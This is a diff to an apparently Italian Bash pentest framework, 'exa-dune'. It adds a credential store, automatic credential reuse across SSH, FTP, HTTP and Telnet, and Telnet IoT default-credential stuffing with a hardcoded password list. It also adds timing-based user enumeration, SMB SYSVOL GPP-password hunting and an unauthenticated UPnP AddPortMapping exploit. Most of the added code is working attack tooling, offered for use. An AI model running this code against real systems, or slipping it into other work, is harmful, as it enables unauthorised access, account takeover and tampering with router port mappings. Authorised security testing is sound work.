@@ -949,6 +949,8 @@ setup_outdir() {
         # SQLite: inizializza DB e registra assessment
         _db_init 2>/dev/null || true
         _db_insert_assessment "$target" "${sub:-global}" "$OUTDIR_BASE" 2>/dev/null || true
+        # Credential store
+        _cred_store_init 2>/dev/null || true
     else
         _log_file=""
     fi
@@ -1152,6 +1154,143 @@ CURL_TIMEOUT=10
 CMD_TIMEOUT=8
 ADAPTIVE=0
 JSON_OUTPUT=0
+CRED_STORE=""          # path a creds.json, impostato da _cred_store_init
+PROPAGATE_CREDS=0      # 1 = abilita propagazione automatica credenziali
+
+# ── Credential Store ─────────────────────────────────────────
+_cred_store_init() {
+    # Inizializza creds.json se non esiste
+    local f="$OUTDIR_BASE/creds.json"
+    [[ "$DRY_RUN" -eq 1 ]] && return
+    [[ -f "$f" ]] || echo '{"credentials":[]}' > "$f"
+    CRED_STORE="$f"
+}
+
+_cred_store_add() {
+    # _cred_store_add <service> <host> <port> <user> <pass> <source>
+    local service="$1" host="$2" port="$3" user="$4" pass="$5" source="${6:-unknown}"
+    [[ -z "$CRED_STORE" ]] && return 0
+    [[ -f "$CRED_STORE" ]] || return 0
+    [[ "$DRY_RUN" -eq 1 ]] && return 0
+    export CRED_FILE="$CRED_STORE" C_SERVICE="$service" C_HOST="$host" \
+           C_PORT="$port" C_USER="$user" C_PASS="$pass" C_SOURCE="$source"
+    python3 - <<'PYEOF' 2>/dev/null || true
+import json, os
+f = os.environ['CRED_FILE']
+with open(f) as fh:
+    d = json.load(fh)
+entry = {
+    "service": os.environ['C_SERVICE'],
+    "host": os.environ['C_HOST'],
+    "port": os.environ['C_PORT'],
+    "user": os.environ['C_USER'],
+    "pass": os.environ['C_PASS'],
+    "source": os.environ['C_SOURCE'],
+    "timestamp": __import__('datetime').datetime.now().isoformat()
+}
+check = {k: entry[k] for k in ('service','host','port','user','pass')}
+if not any(all(c.get(k)==check[k] for k in check) for c in d['credentials']):
+    d['credentials'].append(entry)
+with open(f + '.tmp', 'w') as fh:
+    json.dump(d, fh, indent=2)
+os.replace(f + '.tmp', f)
+PYEOF
+    unset CRED_FILE C_SERVICE C_HOST C_PORT C_USER C_PASS C_SOURCE
+}
+
+_cred_store_get() {
+    # Ritorna lista credenziali per service (o tutte se service="*")
+    # Output: righe "user:pass"
+    local service="${1:-*}" host="${2:-}"
+    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
+    export CRED_FILE="$CRED_STORE" C_SERVICE="$service" C_HOST="$host"
+    python3 - <<'PYEOF' 2>/dev/null || true
+import json, os
+f = os.environ['CRED_FILE']
+svc = os.environ['C_SERVICE']
+hst = os.environ.get('C_HOST', '')
+with open(f) as fh:
+    d = json.load(fh)
+for c in d['credentials']:
+    if (svc == '*' or c['service'] == svc) and (not hst or c['host'] == hst):
+        print(f"{c['user']}\t{c['pass']}")
+PYEOF
+    unset CRED_FILE C_SERVICE C_HOST
+}
+
+_cred_store_summary() {
+    # Stampa tabella riassuntiva credenziali trovate
+    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
+    export CRED_FILE="$CRED_STORE"
+    local count
+    count=$(python3 -c "import json,os; d=json.load(open(os.environ['CRED_FILE'])); print(len(d['credentials']))" 2>/dev/null || echo 0)
+    [[ $count -eq 0 ]] && return 0
+    section "Credenziali trovate ($count)"
+    python3 - <<'PYEOF' 2>/dev/null || true
+import json, os
+f = os.environ['CRED_FILE']
+with open(f) as fh:
+    d = json.load(fh)
+print(f"  {'SERVICE':<10} {'HOST':<16} {'PORT':<6} {'USER':<15} {'PASS':<20} {'SOURCE'}")
+print(f"  {'-'*10} {'-'*16} {'-'*6} {'-'*15} {'-'*20} {'-'*15}")
+for c in d['credentials']:
+    print(f"  {c['service']:<10} {c['host']:<16} {c['port']:<6} {c['user']:<15} {c['pass']:<20} {c['source']}")
+PYEOF
+    unset CRED_FILE
+}
+
+_cred_propagate() {
+    # Prende credenziali già trovate e le testa sui servizi aperti dello stesso host
+    local target="$1"
+    [[ -z "$CRED_STORE" || ! -f "$CRED_STORE" ]] && return 0
+    [[ "$DRY_RUN" -eq 1 ]] && return 0
+    local creds; creds=$(_cred_store_get "*" "$target")
+    [[ -z "$creds" ]] && return 0
+    section "Propagazione credenziali su $target"
+    while IFS=$'\t' read -r user pass; do
+        [[ -z "$user" || -z "$pass" ]] && continue
+        # Testa SSH se porta aperta
+        if check_port "$target" 22; then
+            if tool_ok sshpass; then
+                if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+                   -o BatchMode=no "$user@$target" "id" 2>/dev/null | grep -q uid; then
+                    found CRITICAL "Credential reuse: $user:$pass funziona su SSH ($target:22)"
+                    _cred_store_add ssh "$target" 22 "$user" "$pass" "propagation"
+                fi
+            fi
+        fi
+        # Testa FTP
+        if check_port "$target" 21; then
+            if curl -s --connect-timeout 3 "ftp://$user:$pass@$target/" 2>/dev/null | grep -q .; then
+                found HIGH "Credential reuse: $user:$pass funziona su FTP ($target:21)"
+                _cred_store_add ftp "$target" 21 "$user" "$pass" "propagation"
+            fi
+        fi
+        # Testa HTTP Basic Auth
+        for hport in 80 443 8080 8443; do
+            if check_port "$target" "$hport"; then
+                local scheme="http"; [[ $hport -eq 443 || $hport -eq 8443 ]] && scheme="https"
+                local http_code
+                http_code=$(curl -sk -o /dev/null -w "%{http_code}" \
+                    -u "$user:$pass" --connect-timeout 3 \
+                    "$scheme://$target:$hport/" 2>/dev/null)
+                if [[ "$http_code" =~ ^2 ]]; then
+                    found HIGH "Credential reuse: $user:$pass funziona su HTTP ($target:$hport)"
+                    _cred_store_add http "$target" "$hport" "$user" "$pass" "propagation"
+                fi
+            fi
+        done
+        # Testa Telnet
+        if check_port "$target" 23; then
+            if printf '%s\n%s\nexit\n' "$user" "$pass" | \
+               nc -w 3 "$target" 23 2>/dev/null | grep -qiE "prompt|#|\\\$|>"; then
+                found HIGH "Credential reuse: $user:$pass funziona su Telnet ($target:23)"
+                _cred_store_add telnet "$target" 23 "$user" "$pass" "propagation"
+            fi
+        fi
+    done <<< "$creds"
+    _cred_store_summary
+}
 
 apply_stealth() {
     if [[ $STEALTH -eq 1 ]]; then
@@ -1910,8 +2049,8 @@ cmd_sip() {
 usage_smb() {
     echo "Uso: exa-dune smb <TARGET> [OPTIONS]"
     echo ""
-    echo "  SMB/NetBIOS enumeration e audit"
-    echo "  Wraps: nmap smb NSE, enum4linux, smbclient, hydra"
+    echo "  SMB/NetBIOS enumeration, signing check, GPP password, named pipes"
+    echo "  Wraps: nmap smb NSE, enum4linux, smbclient, hydra, impacket"
     echo ""
     echo "Opzioni:"
     echo "  --no-bruteforce    Salta hydra SMB brute force"
@@ -1961,6 +2100,20 @@ cmd_smb() {
         run_cmd "smb_null" "smbclient -L '//$target' -N 2>&1 | tee \"$OUTDIR\"/smb_null.txt"
     fi
 
+    section "SMB Signing Check"
+    if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_smb.txt" ]]; then
+        if grep -qiE "message_signing.*disabled|signing.*not required|signing.*false" \
+           "$OUTDIR/nmap_smb.txt" 2>/dev/null; then
+            found HIGH "SMB:445 — SMB signing DISABILITATO: credential relay possibile (Responder/ntlmrelayx)"
+        elif grep -qiE "message_signing.*enabled.*not required" "$OUTDIR/nmap_smb.txt" 2>/dev/null; then
+            found MEDIUM "SMB:445 — SMB signing enabled ma non richiesto (relay ancora possibile)"
+        fi
+    else
+        run_cmd "nmap_smb_signing" \
+            "nmap -p 445 --script smb-security-mode \
+             -oN \"$OUTDIR\"/nmap_smb_signing.txt $target 2>&1"
+    fi
+
     section "EternalBlue MS17-010 + SMBGhost CVE-2020-0796"
     run_cmd "nmap_eternalblue" \
         "nmap -p 445 --script smb-vuln-ms17-010 \
@@ -1977,9 +2130,45 @@ cmd_smb() {
             found CRITICAL "SMB:445 — SMBGhost CVE-2020-0796 VULNERABILE"
     fi
 
+    section "Shadow Copy + SYSVOL/NETLOGON Enumeration"
+    if [[ $DRY_RUN -eq 0 ]] && require_tool smbclient; then
+        for share in "SYSVOL" "NETLOGON" "ADMIN\$" "C\$"; do
+            local share_list
+            share_list=$(smbclient "//${target}/${share}" -N -c "ls" 2>&1 || true)
+            if echo "$share_list" | grep -qiE "blocks|listing|NT_STATUS_OK"; then
+                found MEDIUM "SMB — share accessibile anonimamente: ${share}"
+                echo "$share_list" >> "$OUTDIR/smb_share_${share//\$/dollar}.txt"
+                # GPP Password in SYSVOL
+                if [[ "$share" == "SYSVOL" ]]; then
+                    local gpp_search
+                    gpp_search=$(smbclient "//${target}/SYSVOL" -N \
+                        -c "recurse; ls" 2>/dev/null | grep -i "Groups.xml" | head -5 || true)
+                    if [[ -n "$gpp_search" ]]; then
+                        found CRITICAL "SMB SYSVOL — Groups.xml trovato (GPP Password MS14-025 possibile)"
+                        echo "$gpp_search" >> "$OUTDIR/smb_gpp_groups.txt"
+                    fi
+                fi
+            fi
+        done
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} SMB SYSVOL/NETLOGON enum $target"
+    fi
+
+    section "Named Pipe Enumeration"
+    if [[ $DRY_RUN -eq 0 ]] && tool_ok rpcclient; then
+        run_cmd "named_pipes" \
+            "rpcclient -N -U '' $target -c 'srvinfo' 2>&1 | tee \"$OUTDIR\"/smb_pipes.txt || true"
+        run_cmd "named_pipes2" \
+            "nmap -p 445 --script smb-enum-pipes $target \
+             -oN \"$OUTDIR\"/nmap_smb_pipes.txt 2>&1 || true"
+        if [[ -s "$OUTDIR/nmap_smb_pipes.txt" ]]; then
+            grep -c "\\\\pipe\\\\" "$OUTDIR/nmap_smb_pipes.txt" 2>/dev/null | \
+                { read n; [[ ${n:-0} -gt 0 ]] && found MEDIUM "SMB — $n named pipes accessibili"; } || true
+        fi
+    fi
+
     section "SMB Share Write Permission Test"
     if [[ $DRY_RUN -eq 0 ]] && require_tool smbclient; then
-        # Prova scrittura su share noti con null session
         for share in "IPC\$" "C\$" "ADMIN\$" "Users" "share" "public" "data"; do
             local write_test
             write_test=$(smbclient "//${target}/${share}" -N \
@@ -2010,7 +2199,13 @@ cmd_smb() {
                  -o \"$OUTDIR\"/hydra_smb.txt $target smb 2>&1 | tee -a \"$OUTDIR\"/smb_audit.log"
             if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_smb.txt" ]]; then
                 grep -i "login:" "$OUTDIR/hydra_smb.txt" 2>/dev/null \
-                    | while IFS= read -r line; do found HIGH "SMB — $line"; done || true
+                    | while IFS= read -r line; do
+                        found HIGH "SMB — $line"
+                        local hu; hu=$(echo "$line" | grep -oP 'login:\s*\K\S+' || true)
+                        local hp; hp=$(echo "$line" | grep -oP 'password:\s*\K\S+' || true)
+                        [[ -n "$hu" && -n "$hp" ]] && \
+                            _cred_store_add smb "$target" 445 "$hu" "$hp" "smb:hydra"
+                      done || true
             fi
         fi
     fi
@@ -2035,12 +2230,13 @@ usage_creds() {
     echo "  --userlist FILE"
     echo "  --passlist FILE"
     echo "  --threads N        Thread hydra (default: 4)"
+    echo "  --propagate        Propagazione credenziali trovate su altri servizi"
     echo "  --output DIR"
     echo "  --dry-run"
 }
 
 cmd_creds() {
-    local target="" service="" port="" path="/" threads=4
+    local target="" service="" port="" path="/" threads=4 do_propagate=0
     while [[ $# -gt 0 ]]; do
         case "$1" in
             --port)      _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
@@ -2048,6 +2244,7 @@ cmd_creds() {
             --userlist)  _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2"; shift 2 ;;
             --passlist)  _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
             --threads)   _req_arg "$1" "${2:-}"; threads="$2";     shift 2 ;;
+            --propagate) do_propagate=1;   shift ;;
             --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)   DRY_RUN=1;        shift ;;
             --help|-h)   usage_creds; exit 0 ;;
@@ -2077,7 +2274,13 @@ cmd_creds() {
              -o $out $target $svc 2>&1 | tee -a $OUTDIR/creds.log"
         if [[ $DRY_RUN -eq 0 && -f "$out" ]]; then
             grep -i "login:" "$out" 2>/dev/null \
-                | while IFS= read -r line; do found HIGH "${svc^^}:${p} — $line"; done || true
+                | while IFS= read -r line; do
+                    found HIGH "${svc^^}:${p} — $line"
+                    local hu; hu=$(echo "$line" | grep -oP 'login:\s*\K\S+' || true)
+                    local hp; hp=$(echo "$line" | grep -oP 'password:\s*\K\S+' || true)
+                    [[ -n "$hu" && -n "$hp" ]] && \
+                        _cred_store_add "$svc" "$target" "$p" "$hu" "$hp" "creds:hydra"
+                  done || true
         fi
     }
 
@@ -2152,6 +2355,12 @@ cmd_creds() {
         *) err "Servizio sconosciuto: $service (usa: ssh ftp telnet http https smb rdp vnc imap pop3 all)"; exit 1 ;;
     esac
 
+    # Propagazione credenziali se richiesta
+    if [[ $do_propagate -eq 1 ]]; then
+        _cred_propagate "$target"
+    fi
+    _cred_store_summary
+
     ok "Creds test completato → $OUTDIR"
 }
 
@@ -2215,6 +2424,7 @@ cmd_snmp() {
                         local summary; summary=$(echo "$result" | head -1 | tr -d '\n\r' | tr -s ' ')
                         found HIGH "SNMP community '$community' ($ver) → $summary"
                         found_comm="$community"
+                        _cred_store_add snmp "$target" 161 "community" "$community" "snmp"
                         break 2
                     fi
                 done
@@ -2367,6 +2577,7 @@ cmd_ftp() {
             if [[ -n "$anon" ]] && ! echo "$anon" | grep -qiE "530|Login.*failed|denied|refused"; then
                 found HIGH "FTP:${p} — accesso anonimo riuscito"
                 echo "$anon" > "$OUTDIR/ftp_anon_${p}.txt"
+                _cred_store_add ftp "$target" "$p" "anonymous" "pentest@scan.local" "ftp:anon"
             fi
         done
     else
@@ -2432,7 +2643,13 @@ cmd_ftp() {
                  -o \"$OUTDIR\"/hydra_ftp.txt $target ftp 2>&1"
             if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_ftp.txt" ]]; then
                 grep -i "login:" "$OUTDIR/hydra_ftp.txt" 2>/dev/null \
-                    | while IFS= read -r line; do found HIGH "FTP:${port} — $line"; done || true
+                    | while IFS= read -r line; do
+                        found HIGH "FTP:${port} — $line"
+                        local hu; hu=$(echo "$line" | grep -oP 'login:\s*\K\S+' || true)
+                        local hp; hp=$(echo "$line" | grep -oP 'password:\s*\K\S+' || true)
+                        [[ -n "$hu" && -n "$hp" ]] && \
+                            _cred_store_add ftp "$target" "$port" "$hu" "$hp" "ftp:hydra"
+                      done || true
             fi
         fi
     fi
@@ -2561,7 +2778,13 @@ cmd_ssh() {
                  -o \"$OUTDIR\"/hydra_ssh.txt $target ssh 2>&1"
             if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_ssh.txt" ]]; then
                 grep -i "login:" "$OUTDIR/hydra_ssh.txt" 2>/dev/null \
-                    | while IFS= read -r line; do found HIGH "SSH:${port} — $line"; done || true
+                    | while IFS= read -r line; do
+                        found HIGH "SSH:${port} — $line"
+                        local hu; hu=$(echo "$line" | grep -oP 'login:\s*\K\S+' || true)
+                        local hp; hp=$(echo "$line" | grep -oP 'password:\s*\K\S+' || true)
+                        [[ -n "$hu" && -n "$hp" ]] && \
+                            _cred_store_add ssh "$target" "$port" "$hu" "$hp" "ssh:hydra"
+                      done || true
             fi
         fi
     fi
@@ -2575,7 +2798,7 @@ cmd_ssh() {
 usage_telnet() {
     echo "Uso: exa-dune telnet <TARGET> [OPTIONS]"
     echo ""
-    echo "  Telnet banner grab + brute force"
+    echo "  Telnet banner grab + brute force + IoT probes"
     echo "  Wraps: nc (banner), hydra"
     echo ""
     echo "Opzioni:"
@@ -2584,12 +2807,15 @@ usage_telnet() {
     echo "  --userlist FILE"
     echo "  --passlist FILE"
     echo "  --threads N        Thread hydra (default: 4)"
+    echo "  --timing-attack    Abilita timing user enumeration"
+    echo "  --null-auth        Testa null authentication (user e pass vuoti)"
     echo "  --output DIR"
     echo "  --dry-run"
 }
 
 cmd_telnet() {
     local target="" ports_str="23,2323" do_brute=1 threads=4
+    local do_timing=0 do_null_auth=0
     while [[ $# -gt 0 ]]; do
         case "$1" in
             --ports)         _req_arg "$1" "${2:-}"; ports_str="$2";      shift 2 ;;
@@ -2597,6 +2823,8 @@ cmd_telnet() {
             --userlist)      _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
             --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
             --threads)       _req_arg "$1" "${2:-}"; threads="$2";        shift 2 ;;
+            --timing-attack) do_timing=1;         shift ;;
+            --null-auth)     do_null_auth=1;      shift ;;
             --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
             --dry-run)       DRY_RUN=1;           shift ;;
             --help|-h)       usage_telnet; exit 0 ;;
@@ -2611,7 +2839,7 @@ cmd_telnet() {
 
     IFS=',' read -ra ports <<< "$ports_str"
 
-    section "Banner Grab"
+    section "Banner Grab + Fingerprinting Vendor"
     if [[ $DRY_RUN -eq 0 ]]; then
         for p in "${ports[@]}"; do
             local banner
@@ -2619,10 +2847,106 @@ cmd_telnet() {
             if [[ -n "$banner" ]]; then
                 echo "Porta $p: $banner" | tee -a "$OUTDIR/telnet_banners.txt"
                 log "Banner su :$p trovato"
+                # Fingerprinting vendor avanzato
+                local vendor=""
+                echo "$banner" | grep -qiE "cisco ios|ios version"     && vendor="Cisco IOS"
+                echo "$banner" | grep -qiE "junos|juniper"             && vendor="Juniper JunOS"
+                echo "$banner" | grep -qiE "vxworks"                   && vendor="VxWorks (embedded)"
+                echo "$banner" | grep -qiE "audiocodes|mp20[0-9]"      && vendor="AudioCodes VoIP"
+                echo "$banner" | grep -qiE "commend|et96[0-9]"         && vendor="Commend SIP Station"
+                echo "$banner" | grep -qiE "gai.tronics|commander"     && vendor="GAI-Tronics VoIP"
+                echo "$banner" | grep -qiE "busybox|linux"             && vendor="Embedded Linux (BusyBox)"
+                echo "$banner" | grep -qiE "axis"                      && vendor="Axis Camera"
+                # Rilevamento protocollo non-ASCII
+                if echo "$banner" | cat -v 2>/dev/null | grep -q '\^'; then
+                    found MEDIUM "Telnet:$p — banner contiene caratteri non-ASCII (possibile protocollo proprietario)"
+                fi
+                if [[ -n "$vendor" ]]; then
+                    found INFO "Telnet:$p — vendor rilevato: $vendor"
+                    echo "Vendor: $vendor" >> "$OUTDIR/telnet_banners.txt"
+                fi
             fi
         done
     else
-        echo -e "${CYAN}[DRY-RUN]${NC} Telnet banner grab su $target ports ${ports[*]}"
+        echo -e "${CYAN}[DRY-RUN]${NC} Telnet banner grab + fingerprint su $target ports ${ports[*]}"
+    fi
+
+    # Null authentication probe
+    if [[ $do_null_auth -eq 1 ]]; then
+        section "Null Authentication Probe"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            for p in "${ports[@]}"; do
+                check_port "$target" "$p" || continue
+                local null_resp
+                null_resp=$(printf '\n\n\n' | nc -w 4 "$target" "$p" 2>/dev/null | head -5 || true)
+                if echo "$null_resp" | grep -qiE "#|\\\$|>|welcome|prompt|shell"; then
+                    found HIGH "Telnet:$p — possibile null authentication (risposta shell con credenziali vuote)"
+                    echo "$null_resp" >> "$OUTDIR/telnet_null_auth.txt"
+                fi
+            done
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} Null auth probe Telnet $target"
+        fi
+    fi
+
+    # Timing attack per user enumeration
+    if [[ $do_timing -eq 1 ]]; then
+        section "Timing Attack — User Enumeration"
+        if [[ $DRY_RUN -eq 0 ]]; then
+            for p in "${ports[@]}"; do
+                check_port "$target" "$p" || continue
+                local known_user="admin" invalid_user="xXinvalidUser99Xx"
+                local t0 t1 t2 diff_valid diff_invalid
+                t0=$(date +%s%N)
+                printf '%s\n' "$known_user" | nc -w 3 "$target" "$p" >/dev/null 2>&1 || true
+                t1=$(date +%s%N)
+                printf '%s\n' "$invalid_user" | nc -w 3 "$target" "$p" >/dev/null 2>&1 || true
+                t2=$(date +%s%N)
+                diff_valid=$(( (t1 - t0) / 1000000 ))
+                diff_invalid=$(( (t2 - t1) / 1000000 ))
+                local diff_abs=$(( diff_valid - diff_invalid ))
+                [[ $diff_abs -lt 0 ]] && diff_abs=$(( -diff_abs ))
+                echo "Telnet:$p timing — $known_user: ${diff_valid}ms | $invalid_user: ${diff_invalid}ms | diff: ${diff_abs}ms" \
+                    >> "$OUTDIR/telnet_timing.txt"
+                if [[ $diff_abs -gt 500 ]]; then
+                    found MEDIUM "Telnet:$p — possibile user enumeration via timing (diff: ${diff_abs}ms > 500ms)"
+                else
+                    log "Telnet:$p timing: diff ${diff_abs}ms — nessuna anomalia rilevata"
+                fi
+            done
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} Timing attack user enum Telnet $target"
+        fi
+    fi
+
+    # Credential stuffing IoT (nc diretto)
+    section "IoT Credential Stuffing (nc diretto)"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        local iot_creds=(
+            "admin:admin" "admin:1234" "admin:12345" "admin:password"
+            "root:root" "root:toor" "root:1234" "root:"
+            "user:user" "guest:guest" "admin:admin1" "support:support"
+            "operator:operator" "cisco:cisco" "ubnt:ubnt" "admin:admin123"
+        )
+        for p in "${ports[@]}"; do
+            check_port "$target" "$p" || continue
+            local iot_found=0
+            for cred in "${iot_creds[@]}"; do
+                local u="${cred%%:*}" pw="${cred##*:}"
+                local resp
+                resp=$(printf '%s\n%s\nid\n' "$u" "$pw" | nc -w 4 "$target" "$p" 2>/dev/null | head -8 || true)
+                if echo "$resp" | grep -qiE "#|\\\$|>|uid=|welcome.*$u"; then
+                    found HIGH "Telnet:$p — credenziale IoT valida: ${u}:${pw}"
+                    echo "${u}:${pw}" >> "$OUTDIR/telnet_iot_creds.txt"
+                    _cred_store_add telnet "$target" "$p" "$u" "$pw" "telnet:iot-stuffing"
+                    iot_found=1
+                    break
+                fi
+            done
+            [[ $iot_found -eq 0 ]] && log "Telnet:$p — nessuna credenziale IoT comune trovata"
+        done
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} IoT credential stuffing Telnet $target (16 coppie)"
     fi
 
     if [[ $do_brute -eq 1 ]]; then
@@ -2636,7 +2960,13 @@ cmd_telnet() {
                      -o \"$OUTDIR\"/hydra_telnet_${p}.txt $target telnet -s $p 2>&1"
                 if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/hydra_telnet_${p}.txt" ]]; then
                     grep -i "login:" "$OUTDIR/hydra_telnet_${p}.txt" 2>/dev/null \
-                        | while IFS= read -r line; do found HIGH "Telnet:${p} — $line"; done || true
+                        | while IFS= read -r line; do
+                            found HIGH "Telnet:${p} — $line"
+                            local hu; hu=$(echo "$line" | grep -oP 'login:\s*\K\S+' || true)
+                            local hp; hp=$(echo "$line" | grep -oP 'password:\s*\K\S+' || true)
+                            [[ -n "$hu" && -n "$hp" ]] && \
+                                _cred_store_add telnet "$target" "$p" "$hu" "$hp" "telnet:hydra"
+                          done || true
                 fi
             done
         fi
@@ -2908,7 +3238,7 @@ cmd_modbus() {
 usage_upnp() {
     echo "Uso: exa-dune upnp <TARGET> [OPTIONS]"
     echo ""
-    echo "  UPnP/SSDP enumeration e SOAP test"
+    echo "  UPnP/SSDP enumeration, SOAP exploit e IGD detection"
     echo "  Wraps: nmap upnp NSE, curl (SSDP, XML, SOAP)"
     echo ""
     echo "Opzioni:"
@@ -2945,34 +3275,85 @@ cmd_upnp() {
         echo -e "${CYAN}[DRY-RUN]${NC} SSDP M-SEARCH → $target:1900"
     fi
 
-    section "Device Description XML"
+    section "Device Description XML + Service Enumeration"
     local upnp_port=""
+    local control_url=""
     if [[ $DRY_RUN -eq 0 ]]; then
         for p in 2869 1900 5000 49152 49153 52869; do
             local resp
             resp=$(curl -s --max-time 5 \
                 "http://${target}:${p}/upnp/description.xml" \
-                "http://${target}:${p}/rootDesc.xml" 2>/dev/null | head -50)
+                2>/dev/null || curl -s --max-time 5 \
+                "http://${target}:${p}/rootDesc.xml" 2>/dev/null || true)
             if echo "$resp" | grep -qi "deviceType\|UPnP\|manufacturer"; then
                 echo "XML UPnP su porta $p:" | tee -a "$OUTDIR/upnp_description.txt"
                 echo "$resp" >> "$OUTDIR/upnp_description.txt"
-                upnp_port="$p"; break
+                upnp_port="$p"
+                # Estrai services e controlURL
+                grep -oP '(?<=<serviceType>)[^<]+' "$OUTDIR/upnp_description.txt" 2>/dev/null \
+                    | while IFS= read -r svc; do found INFO "UPnP service: $svc"; done || true
+                control_url=$(grep -oP '(?<=<controlURL>)[^<]+' "$OUTDIR/upnp_description.txt" 2>/dev/null | head -1 || true)
+                # IGD detection
+                if echo "$resp" | grep -qi "WANIPConnection\|InternetGatewayDevice\|WANPPPConnection"; then
+                    found HIGH "UPnP — IGD (Internet Gateway Device) rilevato su porta $p"
+                fi
+                break
             fi
         done
+        if [[ -z "$upnp_port" ]]; then
+            log "UPnP: nessuna description XML trovata"
+        fi
     else
         echo -e "${CYAN}[DRY-RUN]${NC} Fetch UPnP XML da $target su porte 2869,1900,5000,49152..."
         upnp_port="2869"
     fi
 
-    section "SOAP GetExternalIPAddress + GetStatusInfo"
-    for p in "${upnp_port:-2869}" 5000 49152; do
-        run_cmd "soap_getip_$p" \
-            "curl -s --max-time 5 -X POST 'http://${target}:${p}/upnp/control' \
+    section "SOAP Action Enumeration (GetExternalIP, GetStatusInfo, GetNATRSIPStatus)"
+    local soap_port="${upnp_port:-2869}"
+    local soap_ctrl="${control_url:-/upnp/control/WANIPConn1}"
+    local soap_urn="urn:schemas-upnp-org:service:WANIPConnection:1"
+
+    for soap_action in GetExternalIPAddress GetStatusInfo GetNATRSIPStatus RequestConnection; do
+        run_cmd "soap_${soap_action}" \
+            "curl -s --max-time 5 -X POST 'http://${target}:${soap_port}${soap_ctrl}' \
              -H 'Content-Type: text/xml; charset=\"utf-8\"' \
-             -H 'SOAPAction: \"\"' \
-             -d '<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:GetExternalIPAddress xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"/></s:Body></s:Envelope>' \
-             2>&1 | tee \"$OUTDIR\"/soap_getip_${p}.txt"
+             -H 'SOAPAction: \"${soap_urn}#${soap_action}\"' \
+             -d '<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:${soap_action} xmlns:u=\"${soap_urn}\"/></s:Body></s:Envelope>' \
+             2>&1 | tee \"$OUTDIR\"/soap_${soap_action}.txt"
+        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/soap_${soap_action}.txt" ]]; then
+            if grep -q "200\|NewExternalIPAddress\|NewConnectionStatus\|NATEnabled" \
+               "$OUTDIR/soap_${soap_action}.txt" 2>/dev/null; then
+                found MEDIUM "UPnP SOAP — $soap_action risponde (no auth)"
+            fi
+        fi
     done
+
+    section "WANIPConnection AddPortMapping (unauthenticated exploit)"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        local add_resp
+        add_resp=$(curl -s --max-time 8 -X POST \
+            "http://${target}:${soap_port}${soap_ctrl}" \
+            -H 'Content-Type: text/xml; charset="utf-8"' \
+            -H "SOAPAction: \"${soap_urn}#AddPortMapping\"" \
+            -d "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"${soap_urn}\"><NewRemoteHost></NewRemoteHost><NewExternalPort>14444</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>14444</NewInternalPort><NewInternalClient>127.0.0.1</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>exa-dune-probe</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>" \
+            2>&1 || true)
+        echo "$add_resp" > "$OUTDIR/upnp_addportmapping.txt"
+        if echo "$add_resp" | grep -qE "HTTP/1\.[01] 200|AddPortMappingResponse"; then
+            found HIGH "UPnP WANIPConnection — AddPortMapping SENZA AUTENTICAZIONE riuscito (porta 14444 mappata)"
+            # Cleanup: DeletePortMapping
+            curl -s --max-time 5 -X POST \
+                "http://${target}:${soap_port}${soap_ctrl}" \
+                -H 'Content-Type: text/xml; charset="utf-8"' \
+                -H "SOAPAction: \"${soap_urn}#DeletePortMapping\"" \
+                -d "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:DeletePortMapping xmlns:u=\"${soap_urn}\"><NewRemoteHost></NewRemoteHost><NewExternalPort>14444</NewExternalPort><NewProtocol>TCP</NewProtocol></u:DeletePortMapping></s:Body></s:Envelope>" \
+                >/dev/null 2>&1 || true
+            log "UPnP cleanup: DeletePortMapping inviato"
+        else
+            log "UPnP AddPortMapping: nessuna risposta positiva"
+        fi
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} UPnP WANIPConnection AddPortMapping exploit $target:${soap_port}"
+    fi
 
     if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/upnp_description.txt" ]]; then
         grep -oP '(?<=<manufacturer>)[^<]+|(?<=<modelName>)[^<]+|(?<=<firmwareVersion>)[^<]+' \
@@ -3752,7 +4133,7 @@ cmd_ipmi() {
 usage_coap() {
     echo "Uso: exa-dune coap <TARGET> [OPTIONS]"
     echo ""
-    echo "  CoAP IoT protocol audit — service discovery, resource enum"
+    echo "  CoAP IoT protocol audit — OBSERVE, DTLS bypass, resource injection"
